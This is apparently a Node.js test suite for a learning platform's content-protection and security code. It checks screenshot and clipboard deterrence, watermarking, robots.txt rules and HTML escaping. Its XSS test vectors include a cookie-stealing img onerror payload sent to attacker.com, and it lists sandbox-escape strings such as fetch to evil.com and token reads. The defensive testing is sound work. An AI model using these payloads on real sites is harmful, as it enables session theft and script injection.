/**
 * Challenger 4: Protection & Security Empirical Adversarial Stress Harness
 * 
 * Comprehensive independent verification of:
 * 1. PrintScreen dual keydown and keyup interception across varied payloads and modifiers.
 * 2. Clipboard overwrite invocation, text attribution, and asynchronous/synchronous failure safety.
 * 3. Screen shield lifecycle, class toggling, re-entrancy, and 2000ms timeout removal.
 * 4. Mobile selectionchange clearing non-input text selections while preserving inputs/editor.
 * 5. Mobile pagehide blur deterrence, touchstart/pointerdown recovery, and iframe non-interference.
 * 6. Dynamic watermark attribution text matching ("steplearn", "تنفيذ وتصميم المهندس أحمد عاشور", "محتوى تعليمي محمي (خُطوة)").
 * 7. Aggressive XSS attribute breakout and script injection sanitization in escapeHtml across app.js and angular-editor.js.
 * 8. Expression evaluation security in angular-editor.js against sandbox escape vectors, casing bypasses, and semicolon injection.
 * 9. CSS layout protection: touch-callout, user-select, print concealment, and watermark non-blocking pointer events.
 * 10. robots.txt and security meta tags verification.
 */

const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");
const assert = require("node:assert/strict");

const projectRoot = path.resolve(__dirname, "..");
const contentProtectionCode = fs.readFileSync(path.join(projectRoot, "content-protection.js"), "utf8");
const appJsCode = fs.readFileSync(path.join(projectRoot, "app.js"), "utf8");
const angularEditorCode = fs.readFileSync(path.join(projectRoot, "angular-editor.js"), "utf8");
const stylesCssCode = fs.readFileSync(path.join(projectRoot, "styles.css"), "utf8");
const robotsTxtCode = fs.readFileSync(path.join(projectRoot, "robots.txt"), "utf8");
const indexHtmlCode = fs.readFileSync(path.join(projectRoot, "index.html"), "utf8");
const securityReportCode = fs.readFileSync(path.join(projectRoot, "SECURITY_AND_IP_REPORT.md"), "utf8");

// --- Test Statistics ---
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failures = [];

function runChallengerTest(name, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✔ [PASS] ${name}`);
  } catch (err) {
    failedTests++;
    failures.push({ name, error: err });
    console.error(`  ✖ [FAIL] ${name}\n    ${err.message}`);
  }
}

// --- High-Fidelity Mock DOM Factory ---
function createMockDOM() {
  const eventListeners = new Map();
  const windowListeners = new Map();
  const timers = new Map();
  let timerIdCounter = 1;
  let simulatedTime = 0;

  class MockClassList {
    constructor() { this.classes = new Set(); }
    add(...names) { names.forEach((n) => this.classes.add(n)); }
    remove(...names) { names.forEach((n) => this.classes.delete(n)); }
    contains(name) { return this.classes.has(name); }
    toggle(name) { if (this.contains(name)) this.remove(name); else this.add(name); }
  }

  class MockElement {
    constructor(tagName, id = "") {
      this.tagName = (tagName || "DIV").toUpperCase();
      this.id = id;
      this.classList = new MockClassList();
      this.style = {};
      this.children = [];
      this._textContent = "";
      this.attributes = new Map();
      this.parentElement = null;
      this.isContentEditable = false;
    }

    get textContent() {
      if (this.children.length > 0) {
        return this.children.map((c) => c.textContent).join(" ");
      }
      return this._textContent || "";
    }

    set textContent(value) {
      this._textContent = String(value);
      this.children = [];
    }

    setAttribute(name, value) { this.attributes.set(name, String(value)); }
    getAttribute(name) { return this.attributes.get(name) || null; }

    appendChild(child) {
      child.parentElement = this;
      this.children.push(child);
      return child;
    }

    removeChild(child) {
      const idx = this.children.indexOf(child);
      if (idx !== -1) {
        this.children.splice(idx, 1);
        child.parentElement = null;
      }
      return child;
    }

    closest(selector) {
      const parts = selector.split(",").map((s) => s.trim());
      let curr = this;
      while (curr) {
        for (const sel of parts) {
          if (sel.startsWith("#") && curr.id === sel.slice(1)) return curr;
          if (sel.startsWith(".") && curr.classList.contains(sel.slice(1))) return curr;
          if (curr.tagName && curr.tagName.toLowerCase() === sel.toLowerCase()) return curr;
        }
        curr = curr.parentElement;
      }
      return null;
    }
  }

  const documentElement = new MockElement("HTML");
  const body = new MockElement("BODY");
  documentElement.appendChild(body);

  const main = new MockElement("MAIN");
  body.appendChild(main);

  const lesson = new MockElement("SECTION", "lesson");
  main.appendChild(lesson);

  const toast = new MockElement("DIV", "toast");
  body.appendChild(toast);

  const learnerActiveName = new MockElement("SPAN", "learnerActiveName");
  learnerActiveName.textContent = "أحمد عاشور";
  body.appendChild(learnerActiveName);

  const codeEditor = new MockElement("TEXTAREA", "code");
  codeEditor.classList.add("cm-editor");
  lesson.appendChild(codeEditor);

  const slotInput = new MockElement("INPUT", "slotBuilderInput");
  slotInput.classList.add("slot-input");
  lesson.appendChild(slotInput);

  const previewIframe = new MockElement("IFRAME", "preview");
  lesson.appendChild(previewIframe);

  const elementsById = new Map([
    ["lesson", lesson],
    ["toast", toast],
    ["learnerActiveName", learnerActiveName],
    ["code", codeEditor],
    ["slotBuilderInput", slotInput],
    ["preview", previewIframe]
  ]);

  let docHasFocus = false;

  const mockDoc = {
    readyState: "complete",
    hidden: false,
    body: body,
    documentElement: documentElement,
    activeElement: body,
    hasFocus() { return docHasFocus; },
    setHasFocus(v) { docHasFocus = !!v; },
    getElementById(id) {
      if (elementsById.has(id)) return elementsById.get(id);
      for (const el of [body, main, lesson, toast, codeEditor, slotInput, previewIframe]) {
        if (el.id === id) return el;
        for (const child of el.children) {
          if (child.id === id) return child;
        }
      }
      return null;
    },
    querySelector(selector) {
      if (selector === "main") return main;
      if (selector === "#lesson") return lesson;
      if (selector === "#toast") return toast;
      if (selector === "#code") return codeEditor;
      if (selector === "iframe") return previewIframe;
      return null;
    },
    createElement(tag) {
      return new MockElement(tag);
    },
    addEventListener(type, handler, capture) {
      if (!eventListeners.has(type)) eventListeners.set(type, []);
      eventListeners.get(type).push({ handler, capture: !!capture });
    },
    removeEventListener(type, handler) {
      if (!eventListeners.has(type)) return;
      eventListeners.set(
        type,
        eventListeners.get(type).filter((item) => item.handler !== handler)
      );
    },
    dispatchEvent(event) {
      const list = eventListeners.get(event.type) || [];
      for (const item of list) {
        item.handler(event);
      }
      return !event.defaultPrevented;
    }
  };

  const clipboardLog = [];
  let clipboardShouldReject = false;
  let clipboardShouldThrowSync = false;
  let currentSelectionRanges = [{ node: lesson }];
  let removeAllRangesCalled = 0;

  const mockWindow = {
    document: mockDoc,
    innerWidth: 1280,
    innerHeight: 800,
    navigator: {
      clipboard: {
        writeText: (text) => {
          if (clipboardShouldThrowSync) {
            throw new Error("Synchronous clipboard crash");
          }
          if (clipboardShouldReject) {
            return Promise.reject(new Error("Clipboard permission denied"));
          }
          clipboardLog.push(String(text));
          return Promise.resolve();
        }
      }
    },
    getSelection: () => ({
      get isCollapsed() {
        return currentSelectionRanges.length === 0;
      },
      get anchorNode() {
        return currentSelectionRanges[0] ? currentSelectionRanges[0].node : null;
      },
      get focusNode() {
        return currentSelectionRanges[0] ? currentSelectionRanges[0].node : null;
      },
      removeAllRanges: () => {
        removeAllRangesCalled++;
        currentSelectionRanges = [];
      }
    }),
    addEventListener(type, handler) {
      if (!windowListeners.has(type)) windowListeners.set(type, []);
      windowListeners.get(type).push(handler);
    },
    removeEventListener(type, handler) {
      if (!windowListeners.has(type)) return;
      windowListeners.set(
        type,
        windowListeners.get(type).filter((h) => h !== handler)
      );
    },
    dispatchEvent(event) {
      const list = windowListeners.get(event.type) || [];
      for (const handler of list) {
        handler(event);
      }
      return !event.defaultPrevented;
    },
    LearnerProfiles: {
      active() {
        return { name: "أحمد عاشور" };
      }
    },
    setTimeout: (fn, delay = 0) => {
      const id = timerIdCounter++;
      timers.set(id, { fn, triggerAt: simulatedTime + delay });
      return id;
    },
    clearTimeout: (id) => {
      timers.delete(id);
    },
    advanceTimersBy: (ms) => {
      simulatedTime += ms;
      const ready = [];
      for (const [id, entry] of timers.entries()) {
        if (entry.triggerAt <= simulatedTime) {
          ready.push({ id, fn: entry.fn });
        }
      }
      ready.forEach(({ id, fn }) => {
        timers.delete(id);
        fn();
      });
    }
  };

  return {
    mockDoc,
    mockWindow,
    body,
    main,
    lesson,
    toast,
    codeEditor,
    slotInput,
    previewIframe,
    clipboardLog,
    setClipboardShouldReject: (val) => { clipboardShouldReject = val; },
    setClipboardShouldThrowSync: (val) => { clipboardShouldThrowSync = val; },
    setSelectionRanges: (ranges) => { currentSelectionRanges = ranges; },
    getRemoveAllRangesCalled: () => removeAllRangesCalled,
    resetRemoveAllRangesCalled: () => { removeAllRangesCalled = 0; }
  };
}

class MockEvent {
  constructor(type, init = {}) {
    this.type = type;
    this.defaultPrevented = false;
    this.propagationStopped = false;
    this.cancelable = init.cancelable !== false;
    this.key = init.key || "";
    this.code = init.code || "";
    this.keyCode = init.keyCode || 0;
    this.which = init.which || init.keyCode || 0;
    this.ctrlKey = !!init.ctrlKey;
    this.metaKey = !!init.metaKey;
    this.shiftKey = !!init.shiftKey;
    this.altKey = !!init.altKey;
    this.target = init.target || null;
    this.clipboardData = {
      cleared: false,
      clearData() { this.cleared = true; }
    };
  }

  preventDefault() {
    if (this.cancelable) this.defaultPrevented = true;
  }

  stopPropagation() {
    this.propagationStopped = true;
  }
}

function loadProtection(mockWindow, mockDoc) {
  const context = {
    window: mockWindow,
    document: mockDoc,
    Date,
    setTimeout: mockWindow.setTimeout,
    clearTimeout: mockWindow.clearTimeout,
    setInterval: () => 1,
    clearInterval: () => {},
    console
  };
  vm.createContext(context);
  vm.runInContext(contentProtectionCode, context);
  const protection = context.window.ContentProtection;
  protection.init();
  return protection;
}

console.log("=================================================================");
console.log("CHALLENGER 4: PROTECTION & SECURITY EMPIRICAL STRESS TEST SUITE");
console.log("=================================================================\n");

// =============================================================================
// TEST SUITE 1: PrintScreen Dual Keydown & Keyup Interception Across Combinations
// =============================================================================
console.log("--- Suite 1: PrintScreen Dual Interception Across Payloads & Modifiers ---");

const prtScPayloads = [
  { desc: "standard key='PrintScreen'", key: "PrintScreen" },
  { desc: "lowercase key='printscreen'", key: "printscreen" },
  { desc: "uppercase key='PRINTSCREEN'", key: "PRINTSCREEN" },
  { desc: "legacy key='Snapshot'", key: "Snapshot" },
  { desc: "lowercase key='snapshot'", key: "snapshot" },
  { desc: "code='PrintScreen'", code: "PrintScreen" },
  { desc: "code='printscreen'", code: "printscreen" },
  { desc: "keyCode=44", keyCode: 44 },
  { desc: "which=44", which: 44 },
  { desc: "Alt + PrintScreen (Window capture)", key: "PrintScreen", altKey: true },
  { desc: "Ctrl + PrintScreen", key: "PrintScreen", ctrlKey: true },
  { desc: "Shift + PrintScreen", key: "PrintScreen", shiftKey: true },
  { desc: "Meta + PrintScreen", key: "PrintScreen", metaKey: true }
];

for (const p of prtScPayloads) {
  runChallengerTest(`PrintScreen keydown: ${p.desc}`, () => {
    const { mockDoc, mockWindow, clipboardLog } = createMockDOM();
    const prot = loadProtection(mockWindow, mockDoc);

    const ev = new MockEvent("keydown", { cancelable: true, ...p });
    mockDoc.dispatchEvent(ev);

    assert.equal(ev.defaultPrevented, true, "Event must be prevented");
    assert.equal(ev.propagationStopped, true, "Event propagation must be stopped");
    assert.equal(prot.isShieldActive(), true, "Screen shield must be active");
    assert.equal(prot.isBlurred(), true, "Content must be blurred");
    assert.ok(clipboardLog.length > 0, "Clipboard overwrite must be called");

    prot.destroy();
  });

  runChallengerTest(`PrintScreen keyup: ${p.desc}`, () => {
    const { mockDoc, mockWindow, clipboardLog } = createMockDOM();
    const prot = loadProtection(mockWindow, mockDoc);

    const ev = new MockEvent("keyup", { cancelable: true, ...p });
    mockDoc.dispatchEvent(ev);

    assert.equal(ev.defaultPrevented, true, "Event must be prevented on keyup");
    assert.equal(ev.propagationStopped, true, "Propagation must be stopped on keyup");
    assert.equal(prot.isShieldActive(), true, "Screen shield must be active on keyup");
    assert.equal(prot.isBlurred(), true, "Content must be blurred on keyup");
    assert.ok(clipboardLog.length > 0, "Clipboard overwrite must be called on keyup");

    prot.destroy();
  });
}

// =============================================================================
// TEST SUITE 2: Clipboard Overwrite Warning & Fault Tolerance
// =============================================================================
console.log("\n--- Suite 2: Clipboard Overwrite Verification & Exception Shielding ---");

runChallengerTest("Clipboard overwrite message contains 'steplearn' and 'تنفيذ وتصميم المهندس أحمد عاشور'", () => {
  const { mockDoc, mockWindow, clipboardLog } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  prot.overwriteClipboardWithWarning();
  assert.ok(clipboardLog.length > 0, "Clipboard writeText must have been called");
  const text = clipboardLog[clipboardLog.length - 1];
  assert.match(text, /steplearn/, "Must contain steplearn");
  assert.match(text, /تنفيذ وتصميم المهندس أحمد عاشور/, "Must contain designer/developer attribution");
  assert.match(text, /الملكية الفكرية/, "Must contain intellectual property notice");

  prot.destroy();
});

runChallengerTest("Clipboard overwrite survives asynchronous promise rejection without unhandled crash", () => {
  const { mockDoc, mockWindow, setClipboardShouldReject } = createMockDOM();
  setClipboardShouldReject(true);
  const prot = loadProtection(mockWindow, mockDoc);

  assert.doesNotThrow(() => {
    prot.overwriteClipboardWithWarning();
    mockDoc.dispatchEvent(new MockEvent("keydown", { key: "PrintScreen", keyCode: 44 }));
  }, "Must handle rejection cleanly");

  prot.destroy();
});

runChallengerTest("Clipboard overwrite survives synchronous exception without unhandled crash", () => {
  const { mockDoc, mockWindow, setClipboardShouldThrowSync } = createMockDOM();
  setClipboardShouldThrowSync(true);
  const prot = loadProtection(mockWindow, mockDoc);

  assert.doesNotThrow(() => {
    prot.overwriteClipboardWithWarning();
  }, "Must catch synchronous throw");

  prot.destroy();
});

runChallengerTest("Clipboard overwrite survives missing navigator or clipboard object", () => {
  const { mockDoc, mockWindow } = createMockDOM();
  delete mockWindow.navigator;
  const prot = loadProtection(mockWindow, mockDoc);

  assert.doesNotThrow(() => {
    prot.overwriteClipboardWithWarning();
  }, "Must handle missing navigator");

  prot.destroy();
});

// =============================================================================
// TEST SUITE 3: Screen Shield Lifecycle, Timeout & Rapid Re-entrancy
// =============================================================================
console.log("\n--- Suite 3: Screen Shield Lifecycle & Re-entrancy Stress ---");

runChallengerTest("Screen shield activates, stays 2000ms, and removes .screen-shield-active automatically", () => {
  const { mockDoc, mockWindow, body } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  prot.triggerScreenShield();
  assert.equal(body.classList.contains("screen-shield-active"), true);
  assert.equal(prot.isShieldActive(), true);

  mockWindow.advanceTimersBy(1999);
  assert.equal(prot.isShieldActive(), true, "Shield must remain active before 2000ms");

  mockWindow.advanceTimersBy(2);
  assert.equal(prot.isShieldActive(), false, "Shield must deactivate after 2000ms");
  assert.equal(body.classList.contains("screen-shield-active"), false);

  prot.destroy();
});

runChallengerTest("Rapid bursts of 10 PrintScreen presses smoothly reset shield timeout without stuck overlay", () => {
  const { mockDoc, mockWindow, body } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  for (let i = 0; i < 10; i++) {
    mockDoc.dispatchEvent(new MockEvent("keydown", { key: "PrintScreen", keyCode: 44 }));
    mockWindow.advanceTimersBy(200); // 200ms interval
    assert.equal(prot.isShieldActive(), true);
  }

  // After 10 presses (t = 1800ms at last press, advanced 200ms in loop, current t = 2000ms)
  // To reach 1900ms after last press (t = 3700ms), advance 1700ms
  mockWindow.advanceTimersBy(1700);
  assert.equal(prot.isShieldActive(), true, "Shield still active 1900ms after 10th press");

  // Advance another 200ms (t = 3900ms, which is 2100ms after 10th press): timer clears
  mockWindow.advanceTimersBy(200);
  assert.equal(prot.isShieldActive(), false, "Shield successfully cleared 2100ms after 10th press");
  assert.equal(body.classList.contains("screen-shield-active"), false);

  prot.destroy();
});

// =============================================================================
// TEST SUITE 4: Mobile Touch-Callout & Selection Clearing
// =============================================================================
console.log("\n--- Suite 4: Mobile Touch-Callout & Selection Clearing ---");

runChallengerTest("styles.css enforces -webkit-touch-callout: none and user-select: none across learning elements", () => {
  assert.match(stylesCssCode, /-webkit-touch-callout:\s*none/i, "Must have -webkit-touch-callout: none");
  assert.match(stylesCssCode, /user-select:\s*none/i, "Must have user-select: none");
  assert.match(stylesCssCode, /\.angular-course-panel[\s\S]*?-webkit-touch-callout:\s*none/i, "Angular panel protected");
  assert.match(stylesCssCode, /\.angular-workbench[\s\S]*?-webkit-touch-callout:\s*none/i, "Angular workbench protected");
});

runChallengerTest("styles.css preserves -webkit-touch-callout: default !important and user-select: text !important for inputs", () => {
  assert.match(stylesCssCode, /user-select:\s*text\s*!important/i, "user-select: text !important preserved");
  assert.match(stylesCssCode, /-webkit-touch-callout:\s*default\s*!important/i, "-webkit-touch-callout: default !important preserved");
});

runChallengerTest("selectionchange clears user selection on non-editable lesson content", () => {
  const { mockDoc, mockWindow, lesson, getRemoveAllRangesCalled, setSelectionRanges } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  mockDoc.activeElement = mockDoc.body;
  setSelectionRanges([{ node: lesson }]);

  mockDoc.dispatchEvent(new MockEvent("selectionchange"));
  assert.equal(getRemoveAllRangesCalled(), 1, "Must call removeAllRanges on lesson text selection");

  prot.destroy();
});

runChallengerTest("selectionchange strictly preserves user selection in code editor or slot inputs", () => {
  const { mockDoc, mockWindow, codeEditor, slotInput, getRemoveAllRangesCalled, setSelectionRanges } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  // Editor selection
  mockDoc.activeElement = codeEditor;
  setSelectionRanges([{ node: codeEditor }]);
  mockDoc.dispatchEvent(new MockEvent("selectionchange"));
  assert.equal(getRemoveAllRangesCalled(), 0, "Must NOT remove selection in code editor");

  // Slot input selection
  mockDoc.activeElement = slotInput;
  setSelectionRanges([{ node: slotInput }]);
  mockDoc.dispatchEvent(new MockEvent("selectionchange"));
  assert.equal(getRemoveAllRangesCalled(), 0, "Must NOT remove selection in slot input");

  prot.destroy();
});

// =============================================================================
// TEST SUITE 5: Mobile Lifecycle, Pagehide Blur & Touch Recovery
// =============================================================================
console.log("\n--- Suite 5: Mobile Lifecycle, Pagehide Blur & Touch Recovery ---");

runChallengerTest("Mobile pagehide blurs content; touchstart and pointerdown instantly unblur", () => {
  const { mockDoc, mockWindow, body } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  assert.equal(prot.isBlurred(), false);

  mockWindow.dispatchEvent(new MockEvent("pagehide"));
  assert.equal(prot.isBlurred(), true, "pagehide must trigger blur");
  assert.equal(body.classList.contains("content-blurred"), true);

  mockWindow.dispatchEvent(new MockEvent("touchstart"));
  assert.equal(prot.isBlurred(), false, "touchstart must clear blur");
  assert.equal(body.classList.contains("content-blurred"), false);

  mockWindow.dispatchEvent(new MockEvent("pagehide"));
  assert.equal(prot.isBlurred(), true);

  mockWindow.dispatchEvent(new MockEvent("pointerdown"));
  assert.equal(prot.isBlurred(), false, "pointerdown must clear blur");

  prot.destroy();
});

runChallengerTest("Iframe interaction (e.g. preview iframe) does NOT falsely trigger blur", () => {
  const { mockDoc, mockWindow, previewIframe } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  mockDoc.activeElement = previewIframe;
  mockWindow.dispatchEvent(new MockEvent("blur"));
  assert.equal(prot.isBlurred(), false, "Focus on preview iframe must NOT cause content blur");

  prot.destroy();
});

// =============================================================================
// TEST SUITE 6: Watermark Text Attribution & Non-Blocking Styling
// =============================================================================
console.log("\n--- Suite 6: Watermark Exact Text Attribution & Non-Blocking Pointer Events ---");

runChallengerTest("Watermark text includes 'steplearn', 'تنفيذ وتصميم المهندس أحمد عاشور', 'محتوى تعليمي محمي (خُطوة)', and learner name", () => {
  const { mockDoc, mockWindow } = createMockDOM();
  const prot = loadProtection(mockWindow, mockDoc);

  prot.renderWatermark();
  const text = prot.getWatermarkText();

  assert.match(text, /steplearn/, "Must contain steplearn");
  assert.match(text, /تنفيذ وتصميم المهندس أحمد عاشور/, "Must attribute to Engineer Ahmed Ashour");
  assert.match(text, /محتوى تعليمي محمي \(خُطوة\)/, "Must contain protective notice");
  assert.match(text, /أحمد عاشور/, "Must include active learner's name");

  const watermarkEl = mockDoc.getElementById("learningWatermark");
  assert.ok(watermarkEl, "Watermark DOM element must exist");
  assert.equal(watermarkEl.getAttribute("aria-hidden"), "true", "Must be aria-hidden");

  prot.destroy();
});

runChallengerTest("styles.css declares pointer-events: none on .learning-watermark", () => {
  assert.match(
    stylesCssCode,
    /\.learning-watermark\s*\{[^}]*pointer-events:\s*none/i,
    "Watermark must have pointer-events: none so clicks pass through"
  );
});

// =============================================================================
// TEST SUITE 7: Single-Quote XSS Escaping in app.js and angular-editor.js
// =============================================================================
console.log("\n--- Suite 7: Aggressive Single-Quote XSS Escaping ---");

const appJsEscapeFn = new Function(`return (${appJsCode.match(/function escapeHtml\([a-zA-Z0-9_]+\)\s*\{[\s\S]*?^\s*\}/m)[0]})`)();
const angularEscapeFn = new Function(`return (${angularEditorCode.match(/function escapeHtml\([a-zA-Z0-9_]+\)\s*\{[\s\S]*?^\s*\}/m)[0]})`)();

const aggressiveXssVectors = [
  {
    name: "Single quote attribute breakout",
    input: "test' onfocus='alert(1)'",
    forbidden: ["'"],
    expected: "test&#39; onfocus=&#39;alert(1)&#39;"
  },
  {
    name: "Double quote attribute breakout",
    input: 'test" onclick="alert(1)"',
    forbidden: ['"'],
    expected: "test&quot; onclick=&quot;alert(1)&quot;"
  },
  {
    name: "Nested single and double quotes with script",
    input: `"><script>alert('xss')</script>`,
    forbidden: ["<script", "</script>", "'", '"'],
    expected: `&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;`
  },
  {
    name: "Img onerror with single quotes",
    input: `<img src=x onerror='fetch("https://attacker.com/leak?c="+document.cookie)'>`,
    forbidden: ["<img", ">", "'", '"'],
    expected: `&lt;img src=x onerror=&#39;fetch(&quot;https://attacker.com/leak?c=&quot;+document.cookie)&#39;&gt;`
  },
  {
    name: "Ampersand entity injection",
    input: "a & b &amp; c",
    forbidden: [" & "],
    expected: "a &amp; b &amp;amp; c"
  },
  {
    name: "Empty / Null / Undefined inputs",
    input: "",
    expected: ""
  }
];

for (const vec of aggressiveXssVectors) {
  runChallengerTest(`app.js escapeHtml: ${vec.name}`, () => {
    const res = appJsEscapeFn(vec.input);
    if (vec.expected !== undefined) assert.equal(res, vec.expected);
    if (vec.forbidden) {
      for (const f of vec.forbidden) {
        assert.equal(res.includes(f), false, `Must not contain forbidden string: ${f}`);
      }
    }
  });

  runChallengerTest(`angular-editor.js escapeHtml: ${vec.name}`, () => {
    const res = angularEscapeFn(vec.input);
    if (vec.expected !== undefined) assert.equal(res, vec.expected);
    if (vec.forbidden) {
      for (const f of vec.forbidden) {
        assert.equal(res.includes(f), false, `Must not contain forbidden string: ${f}`);
      }
    }
  });
}

// =============================================================================
// TEST SUITE 8: Angular-Editor Safe Expression Sanitization
// =============================================================================
console.log("\n--- Suite 8: Angular-Editor Safe Expression Sanitization ---");

const isExpressionSafeMatch = angularEditorCode.slice(
  angularEditorCode.indexOf("function isExpressionSafe"),
  angularEditorCode.indexOf("\nfunction evalTemplateCondition")
).trim();
const isExpressionSafe = new Function(`return (${isExpressionSafeMatch})`)();

const evalTemplateMatch = angularEditorCode.slice(
  angularEditorCode.indexOf("function evalTemplateCondition"),
  angularEditorCode.indexOf("\nfunction isInsideForBlock")
).trim();
const evalTemplateCondition = new Function("isExpressionSafe", `return (${evalTemplateMatch})`)(isExpressionSafe);

const sandboxBypassAttempts = [
  "window",
  "WINDOW",
  "Window",
  "document",
  "DOCUMENT",
  "globalThis",
  "fetch",
  "FETCH",
  "XMLHttpRequest",
  "localStorage",
  "sessionStorage",
  "indexedDB",
  "eval",
  "EVAL",
  "Function",
  "import",
  "process",
  "location",
  "cookie",
  "constructor",
  "__proto__",
  "window.location.href = 'bad.com'",
  "eval('alert(1)')",
  "Function('return this')()",
  "fetch('https://evil.com')",
  "new XMLHttpRequest()",
  "localStorage.getItem('token')",
  "document.cookie = 'stolen'",
  "this.constructor.constructor('return 1')()"
];

for (const expr of sandboxBypassAttempts) {
  runChallengerTest(`Sandbox vector rejected: "${expr}"`, () => {
    assert.equal(isExpressionSafe(expr), false, `isExpressionSafe must return false for ${expr}`);
    const evalRes = evalTemplateCondition(expr, { count: 1 });
    assert.equal(evalRes, false, `evalTemplateCondition must neutralize ${expr}`);
  });
}

// Semicolon injection vectors
runChallengerTest("Semicolon chaining vector: 'fetch(...); count > 0' neutralized", () => {
  const expr = "fetch('https://evil.com'); count > 0";
  assert.equal(evalTemplateCondition(expr, { count: 5 }), false);
});

// Safe expressions that should evaluate correctly
const validExpressions = [
  { expr: "count > 0", scope: { count: 1 }, expected: true },
  { expr: "count === 0", scope: { count: 1 }, expected: false },
  { expr: "isReady && !hasError", scope: { isReady: true, hasError: false }, expected: true },
  { expr: "items.length === 0", scope: { items: [] }, expected: true },
  { expr: "count() > 5", scope: { count: 10 }, expected: true } // Signals syntax
];

for (const item of validExpressions) {
  runChallengerTest(`Legitimate expression passes: "${item.expr}"`, () => {
    assert.equal(isExpressionSafe(item.expr), true, `Expression must be allowed: ${item.expr}`);
    assert.equal(evalTemplateCondition(item.expr, item.scope), item.expected);
  });
}

// =============================================================================
// TEST SUITE 9: Print Stylesheet Concealment & Copyright Attribution
// =============================================================================
console.log("\n--- Suite 9: Print Mode Concealment & Attribution ---");

runChallengerTest("Print stylesheet conceals course materials and displays author attribution", () => {
  assert.match(stylesCssCode, /@media\s+print\s*\{/i);
  assert.match(stylesCssCode, /display:\s*none\s*!important/i);
  assert.match(stylesCssCode, /المحتوى التعليمي لمنصة steplearn \(تنفيذ وتصميم المهندس أحمد عاشور\)/);
});

// =============================================================================
// TEST SUITE 10: AI Crawler Access Directives (robots.txt & Meta Tags)
// =============================================================================
console.log("\n--- Suite 10: AI Crawler Prevention Directives ---");

runChallengerTest("robots.txt blocks required AI scrapers: GPTBot, ClaudeBot, PerplexityBot, etc.", () => {
  const bots = ["GPTBot", "ChatGPT-User", "ClaudeBot", "Anthropic-ai", "CCBot", "Google-Extended", "PerplexityBot"];
  for (const b of bots) {
    const regex = new RegExp(`User-agent:\\s*${b}[\\s\\S]*?Disallow:\\s*/`, "i");
    assert.match(robotsTxtCode, regex, `robots.txt must disallow ${b}`);
  }
});

runChallengerTest("index.html contains noai and noimageai meta tags", () => {
  assert.match(indexHtmlCode, /<meta\s+name=["']robots["']\s+content=["'][^"']*noai/i);
  assert.match(indexHtmlCode, /<meta\s+name=["']robots["']\s+content=["'][^"']*noimageai/i);
});

// =============================================================================
// SUMMARY & VERDICT
// =============================================================================
console.log("\n=======================================================");
console.log(`TOTAL SUB-TESTS: ${totalTests}`);
console.log(`PASSED: ${passedTests}`);
console.log(`FAILED: ${failedTests}`);
console.log("=======================================================\n");

if (failedTests > 0) {
  console.error("FAILURES DETECTED IN CHALLENGER 4 TEST SUITE:");
  failures.forEach((f) => console.error(`- ${f.name}: ${f.error.message}`));
  process.exit(1);
} else {
  console.log("ALL CHALLENGER 4 EMPIRICAL SECURITY STRESS TESTS PASSED SUCCESSFULLY!");
  process.exit(0);
}
